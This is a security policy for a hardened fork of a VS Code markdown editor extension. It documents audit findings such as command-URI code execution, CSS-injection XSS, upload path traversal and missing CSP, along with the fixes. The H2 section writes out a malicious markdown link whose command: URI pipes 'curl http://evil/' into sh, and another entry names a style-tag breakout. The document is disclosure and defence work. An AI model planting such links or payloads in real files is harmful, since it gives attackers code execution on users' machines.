# Security policy — `markdown-editor-hardened`

## Status

T1 complete (as of v0.1.14-hardened). All seven upstream-audit findings closed.
The fork has shipped:

- 6 security fixes (H1–H6, H9) — each with a regression PoC in `tests/pocs/`
- 1 supply-chain fix (vditor 3.8.4 → 3.11.2; local Lute bundle; CSP strict same-origin)
- 4 merged-from-upstream feature PRs (#151 CI, #153 find-widget, #154 auto-focus, #157 line numbers adapted for CSP)
- 7 security PoCs + 1 integration smoke as the regression suite
- CI workflow gating every push + every PR

Upstream `zaaack/vscode-markdown-editor` 0.1.13 (the currently-published Marketplace version) is **still vulnerable to all seven issues** as of this writing. Each fix is being upstreamed as a separate PR — see the "Upstream PR status" table at the bottom of this file.

## Threat model the fork addresses

The audit that motivated this fork was a code review of upstream `0.1.13` /
`0.1.14`, with the following threat model:

> A user has the markdown editor installed in VS Code. The user opens a
> markdown file from an untrusted source (downloaded, attachment, cloned
> repo, or simply received over a messaging app).

Under that threat model, seven issues were identified. All are closed in
this fork:

| # | Class | Severity | Status (this fork) | Status (upstream 0.1.13) | Regression test |
|---|-------|----------|--------------------|--------------------------|-----------------|
| **H1** | Over-broad `localResourceRoots: [/, A:/..Z:/]` — webview can read any file on disk; currently inert but widens the blast radius of any future webview compromise. | low (DiD) | ✅ C1.6 — scoped to `[extensionUri, ...workspace folders, current file dir]`. | unfixed | `tests/pocs/poc-h1-localresourceroots.js` |
| **H2** | RCE via crafted markdown `command:` URI. `enableCommandUris: true` + vditor's Lute markdown sanitizer does NOT strip `command:` schemes from rendered links (verified programmatically against vditor 3.8.4 AND 3.11.2). A `[click](command:workbench.action.terminal.sendSequence?...)` link, opened in the command-mode panel and clicked, executes arbitrary VS Code commands → shell text injection. | **high** | ✅ C1.2 — `enableCommandUris: true` removed; default `false` makes `command:` URI clicks inert. | unfixed | `tests/pocs/poc-h2-command-uri.js` |
| **H3** | XSS via `customCss` raw HTML injection. The setting's value was interpolated directly into a `<style>` block in the webview HTML; a hostile `.vscode/settings.json` could break out with `</style><script>...`. Workspace-trust does not gate this setting in upstream's manifest. | **high** | ✅ T0 defensive stub (C0.2) + C1.4 — `customCss` setting removed; replaced with `customStylesheet` (workspace-relative `.css` PATH, NOT a string-of-CSS; rejects URL/absolute/traversal/wrong-extension; emitted as `<link>`, not `<style>`). | unfixed | `tests/pocs/poc-h3-customcss-xss.js` |
| **H4** | Write-anywhere primitive in `upload` message handler. Webview-supplied filename was joined via `NodePath.join(assetsFolder, f.name)`, which does NOT reject `..`, absolute paths, or NUL bytes. A compromised webview could write outside the assets folder. | medium (high given webview compromise) | ✅ C1.7 — host-side `validateUploadFilename` rejects path separators, dot-prefixes, `.`/`..`, Windows drive letters, NUL bytes, >255-byte names, and verifies `path.basename(name) === name`. | unfixed | `tests/pocs/poc-h4-upload-traversal.js` |
| **H5** | OS-handler pivot via `open-link`. Webview-supplied URLs were passed to `vscode.open` with no scheme allowlist — `file:///Applications/Calculator.app` would launch Calculator (or worse, an attacker-controlled `.app` dropped into `/tmp`). | medium | ✅ C1.9 — scheme allowlist: http, https, mailto. `file:` allowed only if resolved path is inside a workspace folder. Relative paths resolved against the current document, then workspace-containment-checked. Everything else (data:, javascript:, command:, vscode:, ftp:, custom protocols) → silently dropped. | unfixed | `tests/pocs/poc-h5-open-link.js` |
| **H6** | No Content-Security-Policy on webview HTML. With `enableScripts: true` and no CSP, any XSS bug had unfettered `fetch()` access for exfil, inline-script injection ran, and frame-src/object-src defaults were the only barriers. | medium (DiD) | ✅ C1.10 — strict CSP: `default-src 'none'`, `script-src 'nonce-<per-render>' cspSource`, `style-src cspSource 'unsafe-inline'` (vditor's dynamic style injection — see scratchpad I3 for the long-term plan), `connect-src cspSource`, `frame-src 'none'`, `object-src 'none'`, `base-uri 'none'`. Per-render nonce gates every script tag. | unfixed | `tests/pocs/poc-h6-csp.js` |
| **H9** | jsdelivr CDN dependency at runtime. Every editor open fetched vditor's Lute markdown engine + per-feature renderers from `https://cdn.jsdelivr.net/npm/vditor@...`. Supply-chain risk + light telemetry signal. | medium (supply-chain) | ✅ C1.14 — `media-src/copy-vditor-assets.js` copies vditor's `dist/` into `media/vditor/dist/` at build time. Host emits `window.__vditorCdn` pointing at the local URL; webview passes it as the Vditor `cdn` option. CSP `script-src`/`connect-src` no longer allowlist jsdelivr. Production has ZERO outbound network calls at editor-open time. | unfixed | `tests/pocs/poc-h9-cdn-block.js` |
| H7 | (audit-time false positive — `@testing-library/dom` and `@testing-library/user-event` in `dependencies` looked like a debt risk but the call site was legitimate; dropped in C2.1 anyway for bundle size.) | — | ✅ C2.1 — testing-library removed; native `KeyboardEvent` dispatch helper in `media-src/src/keyboard.ts`. -274KB bundle. | unfixed | (not a security issue; covered by the integration smoke test) |
| H8 | (audit-time author-identity check — no concerns surfaced; the fork is unrelated.) | — | n/a | n/a | — |

## Audit details — H2 reachability

H2 is the most severe finding. The exploit chain is:

1. Open a hostile `.md` file in upstream's command-mode panel (Ctrl/Cmd+Shift+Alt+M, or context menu "Open with markdown editor").
2. The file contains a link like:
   ```markdown
   [click](command:workbench.action.terminal.sendSequence?text=curl%20http%3A%2F%2Fevil%2F%7Csh)
   ```
3. The user clicks the link in the rendered editor view.
4. VS Code's webview dispatches the `command:` URI as a VS Code command (because `enableCommandUris: true`). The command runs shell text in the user's integrated terminal.

Lute (vditor's markdown sanitizer, with `SetSanitize(true)` — its default) does NOT strip `command:` URIs from rendered `<a href>` attributes. Verified programmatically against both vditor 3.8.4 (upstream's pin) and vditor 3.11.2 (our pin). The fix removes `enableCommandUris: true`, which makes clicked `command:` URIs inert. The link still renders, but no command fires.

Additional defense in depth landed in T1: H6 (CSP) blocks inline scripts; H3 (customCss redesign) removes one of the XSS entry points; H9 (local Lute) prevents a malicious vditor release from delivering a Lute that DID dispatch commands.

## Upstream PR status

Each independent fix lands upstream as its own PR. Status TBD as we file them:

| PR | Title | Status |
|----|-------|--------|
| #1 | fix: update CI workflow (adopts/co-creditas #151) | pending |
| #2 | security: remove `enableCommandUris` (H2 RCE chain) | pending |
| #3 | security: replace `customCss` raw-HTML setting with `customStylesheet` path (H3) | pending |
| #4 | security: scope `localResourceRoots` (H1) | pending |
| #5 | security: validate `upload` filename (H4) | pending |
| #6 | security: allowlist `open-link` schemes (H5) | pending |
| #7 | security: add CSP to webview HTML (H6) | pending |
| #8 | chore: bump vditor 3.8.4 → 3.11.2 (supersedes #142, credit hackarada) | pending |
| #9 | security: bundle Lute locally (H9 jsdelivr supply-chain) | pending |

(Table will be updated as PRs are filed.)

## Disclosure

If you find a new issue, please open a private security advisory on [github.com/ONEGAYI/vscode-markdown-editor-hardened](https://github.com/ONEGAYI/vscode-markdown-editor-hardened/security/advisories/new) rather than a public issue.

For issues that also affect upstream, we will coordinate disclosure with [zaaack](https://github.com/zaaack).

## Audit trail

Every fix commit references the audit-finding ID (H1–H9) and the design-claim ID (DC<N>) in its commit body. Browse the commit history starting at the T0 commits:

```
git log --grep='\[H[1-9]\]'  # security-fix commits
git log --grep='\[DC[0-9]'    # design-claim commits
```
